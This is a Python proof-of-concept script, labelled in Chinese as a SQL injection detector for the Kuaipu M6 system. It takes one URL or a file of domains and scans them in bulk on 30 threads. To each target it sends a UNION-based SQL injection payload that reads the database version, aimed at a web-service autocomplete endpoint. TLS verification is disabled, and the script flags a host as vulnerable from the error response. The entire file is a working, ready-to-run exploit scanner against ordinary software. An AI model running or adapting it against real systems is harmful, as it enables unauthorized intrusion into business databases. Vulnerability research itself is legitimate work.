import random
import urllib.parse
from multiprocessing.dummy import Pool
import requests, argparse, warnings
from requests.packages import urllib3


ASCII_ART = [
    r"""
    /\_/\  
   ( o.o ) 
    > ^ <
    """,
    r"""
    /\/\/\
   ( •_•) 
   / >   \ 
    """
]


def main():
    print("\n" + random.choice(ASCII_ART) + "\n")
    parse = argparse.ArgumentParser(description="快普M6 SQL注入检测工具")
    parse.add_argument("-u", dest="url", type=str, help="URL")
    parse.add_argument("-f", dest="file", type=str, help="FILE")
    args = parse.parse_args()

    urls = []
    if args.url:
        if 'http://' in args.url:
            urls.append(args.url)
        else:
            urls.append(f"http://{args.url}")
    elif args.file:
        try:
            with open(args.file, 'r+') as f:
                for domain in f:
                    domain = domain.strip()
                    if 'http://' in domain:
                        urls.append(domain)
                    else:
                        urls.append(f"http://{domain}")
        except FileNotFoundError as e:
            print(e)

    pool = Pool(30)
    pool.map(check, urls)


def check(domain):
    url = f"{domain}/WebService/wsAutoComplete.asmx/GetAccountTitleList"
    params = {
        "prefixText": "a' UNION ALL SELECT @@VERSION,NULL--",
        "count": "1",
        "contextKey": "a"
    }

    # 编码为x-www-form-urlencoded格式
    data = urllib.parse.urlencode(params)

    # 设置请求头
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.2431.57 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close"
    }
    try:
        response = requests.post(url=url,data=data, headers=headers, verify=False,allow_redirects=False,timeout=5)
        if (
                response.status_code == 500 and "UNION" in response.text
        ):
            print(f"[*]存在SQL注入:{domain}")
            return True
        else:
            print(f"[-]不存在SQL注入：{domain}")
            return False

    except Exception as e:
        print(f"测试失败: {domain}")
        return False

if __name__ == '__main__':
    main()